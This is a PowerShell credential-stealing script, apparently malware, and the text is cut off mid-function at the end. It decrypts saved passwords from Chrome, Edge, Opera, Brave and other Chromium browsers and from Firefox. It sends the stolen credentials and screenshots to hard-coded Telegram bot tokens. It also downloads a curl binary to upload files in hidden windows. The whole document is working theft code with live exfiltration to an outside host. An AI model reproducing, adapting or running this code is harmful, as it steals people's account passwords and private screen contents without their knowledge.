############################################################ get credential ############################################################
Add-Type -assembly System.Security
[System.reflection.assembly]::LoadWithPartialName("System.Security") > $null
[System.reflection.assembly]::LoadWithPartialName("System.IO") > $null
Function Get-DelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $False)] [Type[]] $parameters,
        [Parameter(Position = 1)] [Type] $returnType = [Void]
    )
    $MyDelegateType = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $MyDelegateType.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $parameters).SetImplementationFlags('Runtime, Managed')
    $MyDelegateType.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $returnType, $parameters).SetImplementationFlags('Runtime, Managed')
    return $MyDelegateType.CreateType()
}

# SQLite
if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class Win32 {
  [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
   public static extern IntPtr GetModuleHandle(string lpModuleName);
  [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
   public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
   public static extern IntPtr LoadLibrary(string name);
  [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
   public static extern bool FreeLibrary(IntPtr hLib);
}
'@
}
if (-not ([System.Management.Automation.PSTypeName]'WinSqlite').Type) {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static partial class WinSqlite {
   public const Int32 OK             =   0;
   public const Int32 ERROR          =   1;
   public const Int32 BUSY           =   5;
   public const Int32 CONSTRAINT     =  19; //  Violation of SQL constraint
   public const Int32 MISUSE         =  21; //  SQLite interface was used in a undefined/unsupported way (i.e. using prepared statement after finalizing it)
   public const Int32 RANGE          =  25; //  Out-of-range index in sqlite3_bind_…() or sqlite3_column_…() functions.
   public const Int32 ROW            = 100; //  sqlite3_step() has another row ready
   public const Int32 DONE           = 101; //  sqlite3_step() has finished executing
   public const Int32 INTEGER        =  1;
   public const Int32 FLOAT          =  2;
   public const Int32 TEXT           =  3;
   public const Int32 BLOB           =  4;
   public const Int32 NULL           =  5;
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_open")]
    public static extern IntPtr open(
     //   [MarshalAs(UnmanagedType.LPStr)]
           String zFilename,
       ref IntPtr ppDB       // db handle
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_exec"
// , CharSet=CharSet.Ansi
   )]
    public static extern IntPtr exec (
           IntPtr db      ,    /* An open database                                               */
//         String sql     ,    /* SQL to be evaluated                                            */
           IntPtr sql     ,    /* SQL to be evaluated                                            */
           IntPtr callback,    /* int (*callback)(void*,int,char**,char**) -- Callback function  */
           IntPtr cb1stArg,    /* 1st argument to callback                                       */
       ref String errMsg       /* Error msg written here  ( char **errmsg)                       */
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_errmsg" , CharSet=CharSet.Ansi)]
    public static extern IntPtr errmsg (
           IntPtr    db
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_prepare_v2", CharSet=CharSet.Ansi)]
    public static extern IntPtr prepare_v2 (
           IntPtr db      ,     /* Database handle                                                  */
           String zSql    ,     /* SQL statement, UTF-8 encoded                                     */
           IntPtr nByte   ,     /* Maximum length of zSql in bytes.                                 */
      ref  IntPtr sqlite3_stmt, /* int **ppStmt -- OUT: Statement handle                            */
           IntPtr pzTail        /*  const char **pzTail  --  OUT: Pointer to unused portion of zSql */
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_int")]
    public static extern IntPtr bind_int(
           IntPtr           stmt,
           IntPtr /* int */ index,
           IntPtr /* int */ value);
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_int64")]
    public static extern IntPtr bind_int64(
           IntPtr           stmt,
           IntPtr /* int */ index,  // TODO: Is IntPtr correct?
           Int64            value);
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_double")]
    public static extern IntPtr bind_double (
           IntPtr           stmt,
           IntPtr           index,
           Double           value
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_text")]
    public static extern IntPtr bind_text(
           IntPtr    stmt,
           IntPtr    index,
//        [MarshalAs(UnmanagedType.LPStr)]
           IntPtr    value , /* const char*                  */
           IntPtr    x     , /* What does this parameter do? */
           IntPtr    y       /* void(*)(void*)               */
     );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_blob")]
    public static extern IntPtr bind_blob(
           IntPtr    stmt,
           Int32     index,
           IntPtr    value,
           Int32     length,   // void*
           IntPtr    funcPtr   // void(*)(void*)
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_null")]
    public static extern IntPtr bind_null (
           IntPtr    stmt,
           IntPtr    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_step")]
    public static extern IntPtr step (
           IntPtr    stmt
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_reset")]
    public static extern IntPtr reset (
           IntPtr    stmt
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_count")]
    public static extern Int32 column_count ( // Int32? IntPtr? Int64?
            IntPtr   stmt
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_type")] // Compare with sqlite3_column_decltype()
    public static extern IntPtr column_type (
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_double")]
    public static extern Double column_double (
            IntPtr   stmt,
            Int32    index
   );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_int")] // TODO: should not generally sqlite3_column_int64 be used?
    public static extern IntPtr column_int(
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_int64")]
    public static extern Int64 column_int64(
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_text"
//   , CharSet=CharSet.Ansi
    )]
// [return: MarshalAs(UnmanagedType.LPStr)]
    public static extern IntPtr column_text (
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_blob"
    )]
    public static extern IntPtr column_blob (
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_bytes"
    )]
    public static extern Int32  column_bytes (
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_finalize")]
    public static extern IntPtr finalize (
           IntPtr    stmt
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_close")]
    public static extern IntPtr close (
           IntPtr    db
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_last_insert_rowid")]
    public static extern Int64 last_insert_rowid (
           IntPtr    db
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_next_stmt")]
    public static extern IntPtr next_stmt (
           IntPtr    db,
           IntPtr    stmt
    );
// [DllImport("winsqlite3.dll")]
//   public static extern IntPtr sqlite3_clear_bindings(
//          IntPtr    stmt
//  );
}
"@
}

iex @'
function utf8PointerToStr([IntPtr]$charPtr) {
  [OutputType([String])]
 #
 # Create a .NET/PowerShell string from the bytes
 # that are pointed at by $charPtr
 #
   [IntPtr] $i = 0
   [IntPtr] $len = 0
   while ( [Runtime.InteropServices.Marshal]::ReadByte($charPtr, $len) -gt 0 ) {
     $len=$len+1
   }
   [byte[]] $byteArray = new-object byte[] $len
   while ( [Runtime.InteropServices.Marshal]::ReadByte($charPtr, $i) -gt 0 ) {
      $byteArray[$i] = [Runtime.InteropServices.Marshal]::ReadByte($charPtr, $i)
       $i=$i+1
   }
   return [System.Text.Encoding]::UTF8.GetString($byteArray)
}
function pointerToByteArray([IntPtr]$blobPtr, [Int32]$len) {
  [OutputType([Byte[]])]
  [byte[]] $byteArray = new-object byte[] $len
   for ($i = 0; $i -lt $len; $i++) {
      $byteArray[$i] = [Runtime.InteropServices.Marshal]::ReadByte($blobPtr, $i)
   }
 #
 # The comma between the return statement and the
 # $byteArray variable makes sure that a byte
 # array is returned rather than an array of objects.
 # See https://stackoverflow.com/a/61440166/180275
 #
   return ,$byteArray
}
function byteArrayToPointer([Byte[]] $ary) {
   [IntPtr] $heapPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($ary.Length);
   [Runtime.InteropServices.Marshal]::Copy($ary, 0, $heapPtr, $ary.Length);
   return $heapPtr
}
function strToUtf8Pointer([String] $str) {
   [OutputType([IntPtr])]
 #
 # Create a UTF-8 byte array on the unmanaged heap
 # from $str and return a pointer to that array
 #
   [Byte[]] $bytes      = [System.Text.Encoding]::UTF8.GetBytes($str);
 # Zero terminated bytes
   [Byte[]] $bytes0    = new-object 'Byte[]' ($bytes.Length + 1)
   [Array]::Copy($bytes, $bytes0, $bytes.Length)
   return byteArrayToPointer $bytes0
#  [IntPtr] $heapPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($bytes0.Length);
#  [Runtime.InteropServices.Marshal]::Copy($bytes0, 0, $heapPtr, $bytes0.Length);
#  return $heapPtr
}
function SqliteDBOpen([String] $dbFileName){
  [OutputType([IntPtr])]
  [IntPtr] $db_ = 0
  $res = [WinSqlite]::open($dbFileName, [ref] $db_)
  if ($res -ne [WinSqlite]::OK) {
    throw "Could not open $dbFileName"
  }
  return $db_
}
function SqliteDBclose([IntPtr] $db) {
  [OutputType([void])]
  $openStmtHandles = new-object System.Collections.Generic.List[IntPtr]
  [IntPtr] $openStmtHandle = 0
  while ( ($openStmtHandle = [WinSqlite]::next_stmt($db, $openStmtHandle)) -ne 0) {
      $openStmtHandles.add($openStmtHandle)
  }
  foreach ($openStmtHandle in $openStmtHandles) {
      $res = [WinSqlite]::finalize($openStmtHandle)
      if ($res -ne [WinSqlite]::OK) {
          throw "sqliteFinalize: res = $res"
      }
  }
  $res = [WinSqlite]::close($db)
  if ($res -ne [WinSqlite]::OK) {
      if ($res -eq [WinSqlite]::BUSY) {
        write-warning "Close database: database is busy"
      }
      else {
        write-warning "Close database: $res"
        write-warning (utf8PointerToStr ([WinSqlite]::errmsg($db)))
      }
      write-error (utf8PointerToStr ([WinSqlite]::errmsg($db)))
      throw "Could not close database"
  }
}
function SqliteStmtPrepare([IntPtr] $db, [String] $sql) {
  [OutputType([IntPtr])]
  [IntPtr] $handle_ = 0
  $res = [WinSqlite]::prepare_v2($db, $sql, -1, [ref] $handle_, 0)
  if ($res -ne [WinSqlite]::OK) {
      write-warning "prepareStmt: sqlite3_prepare failed, res = $res"
      write-warning (utf8PointerToStr ([WinSqlite]::errmsg($db)))
      return $null
  }
  return $handle_
}
function SqliteStmtStep([IntPtr] $handle) {
  [OutputType([IntPtr])]
  $res = [WinSqlite]::step($handle)
  return $res
}
function SqliteStmtCol(
    [IntPtr] $handle,
    [Int] $index
) {
  [OutputType([object])]
  $colType = [WinSqlite]::column_type($handle, $index)
  switch ($colType) {
      ([WinSqlite]::INTEGER) {
      #
      # Be safe and return a 64-bit integer because there does
      # not seem a way to determine if a 32 or 64-bit integer
      # was inserted.
      #
        return [WinSqlite]::column_int64($handle, $index)
      }
      ([WinSqlite]::FLOAT)   {
        return [WinSqlite]::column_double($handle, $index)
      }
      ([WinSqlite]::TEXT)    {
        [IntPtr] $charPtr = [WinSqlite]::column_text($handle, $index)
        return utf8PointerToStr $charPtr
      }
      ([WinSqlite]::BLOB)   {
        [IntPtr] $blobPtr = [WinSqlite]::column_blob($handle, $index)
        return pointerToByteArray $blobPtr [WinSqlite]::column_bytes($handle, $index)
      }
      ([WinSqlite]::NULL)    {
        return $null
      }
      default           {
        throw "This should not be possible $([WinSqlite]::sqlite3_column_type($handle, $index))"
      }
  }
  return $null
}
function SqliteStmtfinalize([IntPtr] $handle) {
  [OutputType([void])]
  $res = [WinSqlite]::finalize($handle)
  if ($res -ne [WinSqlite]::OK) {
      throw "sqliteFinalize: res = $res"
  }
}
'@

Function Convert-HexToByteArray {
    [cmdletbinding()]
    param(
        [parameter(Mandatory=$true)]
        [String]
        $HexString
    )

    $Bytes = [byte[]]::new($HexString.Length / 2)
    For($i=0; $i -lt $HexString.Length; $i+=2){
        $Bytes[$i/2] = [convert]::ToByte($HexString.Substring($i, 2), 16)
    }
    $Bytes
}
# Đọc dữ liệu đăng nhập 
function Read-ChromiumLCData {
    param (
        $master_key,
        $path,
        $query
    )

    $_rows = New-Object 'System.Collections.ArrayList'
    $sDatabasePath="$env:LocalAppData\SQLiteData"
    copy-item "$path" "$sDatabasePath"


    [IntPtr] $db = SqliteDBOpen $sDatabasePath
    [IntPtr] $stmt = SqliteStmtPrepare $db $query

    if (-not $stmt) {
        return @()
    }

    while ( (SqliteStmtStep $stmt) -ne [WinSqlite]::DONE ) {
        try {
            $encrypted_data = SqliteStmtCol $stmt 2
            if ($encrypted_data.StartsWith("763130") -or $encrypted_data.StartsWith("763131") -or $encrypted_data.StartsWith("76313")) {
                [void]$_rows.Add(@(
                    (SqliteStmtCol $stmt 0),
                    (SqliteStmtCol $stmt 1),
                    $encrypted_data
                ))
                continue
            }
            if ($encrypted_data.StartsWith("01000000")) {
                $encrypted_data = Convert-HexToByteArray $encrypted_data
                $UnprotectScope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                $decrypted_data = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted_data, $null, $UnprotectScope)
                $decrypted_data = [System.Text.Encoding]::ASCII.GetString($decrypted_data)
                [void]$_rows.Add(@(
                    (SqliteStmtCol $stmt 0),
                    (SqliteStmtCol $stmt 1),
                    $decrypted_data
                ))
                continue
            }
            [void]$_rows.Add(@(
                (SqliteStmtCol $stmt 0),
                (SqliteStmtCol $stmt 1),
                $encrypted_data
            ))
        }catch{$_}
    }

    SqliteStmtfinalize $stmt > $null
    SqliteDBclose $db > $null

    Remove-Item -path "$sDatabasePath" 2> $null

    return $_rows
}
# Lấy được decrypted_key ở đường dẫn localstate dưới dạng hex
function Read-ChromiumLocalState {
    param (
        $path
    )

    $localStateFile = "$env:LocalAppData\ChromiumLocalState"
    copy-item "$path" "$localStateFile"
    $encrypted_key = [System.Convert]::FromBase64String((Select-String -Path "$localStateFile" '"encrypted_key":"([^"]+?)"' -AllMatches | Foreach-Object {$_.Matches} | Foreach-Object {$_.Groups[1].Value}))
    Remove-Item -path "$localStateFile" 2> $null
	
    $UnprotectScope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    $decrypted_key = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted_key[5..$encrypted_key.length], $null, $UnprotectScope)
    return $decrypted_key
}
function Get-DataCredential{
$data = [ordered]@{}

# Chromium
# https://chromium.googlesource.com/chromium/src/+/HEAD/docs/user_data_dir.md
$chrome = @("Chrome", "Chrome Beta", "Chrome SxS")
$chromiumPaths = @()
foreach($_item in $chrome) {
    $chromiumPaths += "$env:LocalAppData\Google\$_item"
}


# Untested
# lấy các đường dẫn của các trình duyệt
$chromiumPaths += "$env:LocalAppData\Chromium"
$chromiumPaths += "$env:AppData\Opera Software\Opera Stable"
$chromiumPaths += "$env:AppData\Opera Software\Opera GX Stable"
$chromiumPaths += "$env:LocalAppData\Microsoft\Edge"
$chromiumPaths += "$env:LocalAppData\CocCoc\Browser"
$chromiumPaths += "$env:LocalAppData\BraveSoftware\Brave-Browser"
$chromiumPaths += "$env:LocalAppData\Yandex\YandexBrowser"
$chromiumPaths += "$env:LocalAppData\Tencent\QQBrowser"

foreach ($chromiumPath in $chromiumPaths) {
    if ( -not (Test-Path -Path "$chromiumPath") ) {
        continue
    }
    $data[$chromiumPath] = @{}
    try{
        # Read local state data

        $data[$chromiumPath]['decrypted_key'] = Read-ChromiumLocalState -path "$chromiumPath\User Data\Local State"
        
    }catch{$_}

    # Read dir
    $folders = Get-ChildItem -Name -Directory "$chromiumPath\User Data"
    foreach ($_folder in $folders) {
        $folder = $_folder.ToLower()
        if (-not ($folder -eq "default" -or $folder.StartsWith("profile "))) {
            continue
        }

        $data[$chromiumPath][$_folder] = [ordered]@{}
        try {
            # Read logins data
            $data[$chromiumPath][$_folder]['logins'] = Read-ChromiumLCData -master_key "$data['decrypted_key']" -path "$chromiumPath\User Data\$_folder\Login Data" -query 'select origin_url,username_value,hex(password_value) from logins'
        }catch{$_}
    }

}
return $data
}

#### firefox ####
Function Find-FirefoxFiles
{
    <#
    .SYNOPSIS

    Finds the main files used for firefox browser exfiltration

    .DESCRIPTION

    Finds the paths to the following files for the current user:
    Bookmarks, Cookies, History, Login Data, Preferences, Top Sites, Web Data
    #>

    $profilesDir = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles\'
    $profiles = Get-ChildItem -Path $profilesDir | Where-Object { $_.PSIsContainer }
	
    $verifiedLocations = @{}
    foreach ($profiledir in $profiles){
        $temp = Join-Path -Path $profiledir -ChildPath 'logins.json'
        $temp2 = Join-Path -Path $profilesDir -ChildPath $temp
        if(Test-Path -Path $temp2 -PathType Leaf){
            $core = Join-Path -Path $profilesDir -ChildPath $profiledir
            $places = Join-Path -Path $core -ChildPath 'places.sqlite'
            $cookies = Join-Path -Path $core -ChildPath 'cookies.sqlite'
            $forms = Join-Path -Path $core -ChildPath 'formhistory.sqlite'
            $passwords = Join-Path -Path $core -ChildPath 'logins.json'
            $verifiedLocations.add('profile', $core)
            $verifiedLocations.add('places', $places)
            $verifiedLocations.add('cookies', $cookies)
            $verifiedLocations.add('forms', $forms)
            $verifiedLocations.add('passwords', $passwords)
        }
    }
    return $verifiedLocations
}
Function ConvertFrom-NSS
{
    <#
    .SYNOPSIS

    Converts sensitive information (firefox passwords) to plaintext

    .PARAMETER Data

    The base64 encoded and encrypted data to decrypt
    Can be an array

    .PARAMETER ProfileDir

    The firefox profile directory of the encoded data
    #>

    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        [String[]] $Data,

        [Parameter(Position = 1, Mandatory = $true)]
        [String] $ProfileDir
    )

    # Search for the nss3.dll file
    $locations = @(
        Join-Path $env:ProgramFiles 'Mozilla Firefox'
        Join-Path ${env:ProgramFiles(x86)} 'Mozilla Firefox'
        Join-Path $env:ProgramFiles 'Nightly'
        Join-Path ${env:ProgramFiles(x86)} 'Nightly'
    )

    [String] $NSSDll = ''
    foreach($loc in $locations)
    {
        $nssPath = Join-Path $loc 'nss3.dll'
        if(Test-Path $nssPath)
        {
            $NSSDll = $nssPath
            break
        }
    }
    if($NSSDll -eq '')
    {
        return $NULL
    }

    # Based on https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-3/

    # Create the ModuleBuilder
    $DynAssembly = New-Object System.Reflection.AssemblyName('NSSLib')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('NSSLib', $False)

    # Define a new class
    $TypeBuilder = $ModuleBuilder.DefineType('NSS', 'Public, Class')
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
    )

    # Define NSS_Init
    $PInvokeMethodInit = $TypeBuilder.DefineMethod(
        'NSS_Init',
        [Reflection.MethodAttributes] 'Public, Static',
        [Int],
        [Type[]] @([String]))
    $FieldValueArrayInit = [Object[]] @(
        'NSS_Init',
        $True,
        $True,
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::ANSI
    )
    $SetLastErrorCustomAttributeInit = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @($NSSDll),
        $FieldArray,
        $FieldValueArrayInit)
    $PInvokeMethodInit.SetCustomAttribute($SetLastErrorCustomAttributeInit)

    # Define SecItem Struct
    $StructAttributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $StructBuilder = $ModuleBuilder.DefineType('SecItem', $StructAttributes, [System.ValueType])
    $StructBuilder.DefineField('type', [int], 'Public') | Out-Null
    $StructBuilder.DefineField('data', [IntPtr], 'Public') | Out-Null
    $StructBuilder.DefineField('len', [int], 'Public') | Out-Null
    $SecItemType = $StructBuilder.CreateType()

    # Define PK11SDR_Decrypt
    $PInvokeMethodDecrypt = $TypeBuilder.DefineMethod(
        'PK11SDR_Decrypt',
        [Reflection.MethodAttributes] 'Public, Static',
        [Int],
        [Type[]] @($SecItemType, $SecItemType.MakeByRefType()))
    $FieldValueArrayDecrypt = [Object[]] @(
        'PK11SDR_Decrypt',
        $True,
        $True,
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Unicode
    )
    $SetLastErrorCustomAttributeDecrypt = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @($NSSDll),
        $FieldArray,
        $FieldValueArrayDecrypt)
    $PInvokeMethodDecrypt.SetCustomAttribute($SetLastErrorCustomAttributeDecrypt)

    $NSS = $TypeBuilder.CreateType()

    # Initiate the NSS library
    $NSS::NSS_Init($ProfileDir) | Out-Null

    $decryptedArray = New-Object System.Collections.ArrayList
    foreach($dataPart in $Data)
    {
        # Decode data into bytes and marshal them into a pointer
        $dataBytes = [System.Convert]::FromBase64String($dataPart)
        $dataPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dataBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($dataBytes, 0, $dataPtr, $dataBytes.Length)

        # Set up structures
        $encrypted = [Activator]::CreateInstance($SecItemType)
        $encrypted.type = 0
        $encrypted.data = $dataPtr
        $encrypted.len = $dataBytes.Length

        $decrypted = [Activator]::CreateInstance($SecItemType)
        $decrypted.type = 0
        $decrypted.data = [IntPtr]::Zero
        $decrypted.len = 0

        # Decrypt the data
        $NSS::PK11SDR_Decrypt($encrypted, [ref] $decrypted) | Out-Null

        # Get string data back out
        $bytePtr = $decrypted.data
        $byteData = [byte[]]::new($decrypted.len)
        [System.Runtime.InteropServices.Marshal]::Copy($bytePtr, $byteData, 0, $decrypted.len)
        $dataStr = [System.Text.Encoding]::UTF8.GetString($byteData)

        # Add the result to the array
        $decryptedArray.Add($dataStr) | Out-Null

        # Deallocate the pointer memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($dataPtr)
    }
    
    return $decryptedArray.ToArray()
}
function getFirefoxCredentials{
    $firefoxFiles = Find-FirefoxFiles
    # Read passwords json file and get profile dir
    $passwordData = ((Get-Content -Path $firefoxFiles['passwords']) | ConvertFrom-Json).logins
    $profileDir = $firefoxFiles['profile']
    
    # Revised is the returned object while decrypt is a list of things to decrypt
    # Decrypt size is length * 2 because for each entry, both the username and password are encrypted
    $length = $passwordData.Length
    $revised = @(0) * $length
    $decrypt = @(0) * ($length * 2)

    # Add items to be decrypted
    for($i = 0; $i -lt $length; $i++)
    {
        $decrypt[($i * 2) - 1] = $passwordData[$i].encryptedUsername
        $decrypt[($i * 2)] = $passwordData[$i].encryptedPassword
    }

    # Decrypt the items
    $decrypted = ConvertFrom-NSS -Data $decrypt -ProfileDir $profileDir

    # Populate the revised array and return it
    for($i = 0; $i -lt $length; $i++)
    {
        $revisedPart = $passwordData[$i] | Select-Object * -ExcludeProperty @('httpRealm', 'encryptedUsername', 'encryptedPassword')
        $revisedPart | Add-Member -MemberType 'NoteProperty' -Name 'username' -Value $decrypted[($i * 2) - 1]
        $revisedPart | Add-Member -MemberType 'NoteProperty' -Name 'password' -Value $decrypted[($i * 2)]
        $revised[$i] = $revisedPart
    }
    return $revised
}
    

######### end firefox ######

######################################################################################## end get credential #############################################################################

function sendCredentials{
  $data = Get-DataCredential
  $data | ConvertTo-Json -Depth 9 -Compress | Out-File credentials.json
  $file = "credentials.json";
  if(Test-Path -Path $file -PathType Container){
      Compress-Archive -Path $file -Destination "$file.zip" -Force;
      rm $file -Force -Recurse
      $file = "$file.zip"
  }
  $chat_id=6238346325
  $token="6233623113:AAESmYwdqGlUrFhUk9r9GAX0ix1zrrxfCfA"
  Add-Type -AssemblyName System.Net.Http
  $form = new-object System.Net.Http.MultipartFormDataContent
  $form.Add($(New-Object System.Net.Http.StringContent $Chat_ID), 'chat_id')
  $Content = [System.IO.File]::ReadAllBytes($file)
  $byte = New-Object System.Net.Http.ByteArrayContent ($Content, 0, $Content.Length)
  $byte.Headers.Add('Content-Type','text/plain')
  $name = "$($env:COMPUTERNAME)_$($file)" -replace ':|\\|\?','_'
  $form.Add($byte, 'document', $name)
  $ms = new-object System.IO.MemoryStream
  $form.CopyToAsync($ms).Wait()
  Invoke-WebRequest -Method Post -Body $ms.ToArray() -Uri "https://api.telegram.org/bot$token/sendDocument" -ContentType $form.Headers.ContentType.ToString()
  $MessageFirefox = getFirefoxCredentials
  Invoke-RestMethod -Uri "https://api.telegram.org/bot$($token)/sendMessage?chat_id=$($chat_id)&text=$($MessageFirefox)"
  rm $file -Force -Recurse
}
function bot-send {

param ($photo,$file,$botkey,$chat_id)

$proxy = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').proxyServer
$ruta = $env:USERPROFILE + "\appdata\local\temp\1"
$curl_zip = $ruta + "\curl_752_1.zip"
$curl = $ruta + "\" + "curl.exe"
$curl_mod = $ruta + "\" + "curl_mod.exe"
if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("http://www.paehl.com/open_source/?download=curl_752_1_ssl.zip","$curl_zip")
[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
[System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null

Disable-Smartscreen -File $curl -Output $curl_mod
Remove-Item $curl ; Remove-Item $curl_zip
}

if ($file -ne $null) {
$proceso = $curl_mod
$uri = "https://api.telegram.org/bot" + $botkey + "/sendDocument"
if ($proxy -ne $null) {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $file  + ' -k ' + '--proxy ' + $proxy } else {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $file  + ' -k '}
Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden}

if ($photo -ne $null){

$proceso = $curl_mod
$uri = "https://api.telegram.org/bot" + $botkey + "/sendPhoto"
if ($proxy -ne $null) {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k ' + '--proxy ' + $proxy } else {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k '}
Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden

}
}
function whoami_me {
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{[string]$privilegios = "Sin privilegios" }  else {[string]$privilegios = "Privilegios Altos"}; $usuario = $env:USERNAME ; $dominio = $env:USERDOMAIN
$Usuario = "Usuario: $usuario`n" ; $Dominio =  "Dominio : $dominio`n" ; $Privilegios = "Privilegios : $privilegios`n"; return $usuario, $dominio, $privilegios
 }
function screen-shot {
Add-type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Screen]::AllScreens|%{$bounds =$_.bounds;
if($bounds.width -lt 1920){$bounds.width=1920}
if($bounds.height -lt 1080){$bounds.height=1080}
$image = New-Object Drawing.Bitmap $bounds.width, $bounds.height
$graphics = [Drawing.Graphics]::FromImage($image)
$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
$screen_file = "$env:tmp\$($_.DeviceName.replace('\\.\',''))_$((get-date).tostring('yyyyMMddHHmmss')).png"
$image.Save($screen_file)
$graphics.Dispose()
$image.Dispose()
$screen_file}
$file = $screen_file
if(Test-Path -Path $file -PathType Container){
    Compress-Archive -Path $file -Destination "$file.zip" -Force;
    rm $file -Force -Recurse
    $file = "$file.zip"
}
$chat_id=1175661447
$token="6133754116:AAHQG5DpK_IkWj6bQZwy7ptsXLlFfUXKZxU"
Add-Type -AssemblyName System.Net.Http
$form = new-object System.Net.Http.MultipartFormDataContent
$form.Add($(New-Object System.Net.Http.StringContent $Chat_ID), 'chat_id')
$Content = [System.IO.File]::ReadAllBytes($file)
$byte = New-Object System.Net.Http.ByteArrayContent ($Content, 0, $Content.Length)
$byte.Headers.Add('Content-Type','text/plain')
$name = "$($env:COMPUTERNAME)_$($file)" -replace ':|\\|\?','_'
$form.Add($byte, 'document', $name)
$ms = new-object System.IO.MemoryStream
$form.CopyToAsync($ms).Wait()
Invoke-WebRequest -Method Post -Body $ms.ToArray() -Uri "https://api.telegram.org/bot$token/sendDocument" -ContentType $form.Headers.ContentType.ToString()
rm $screen_file
}
function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
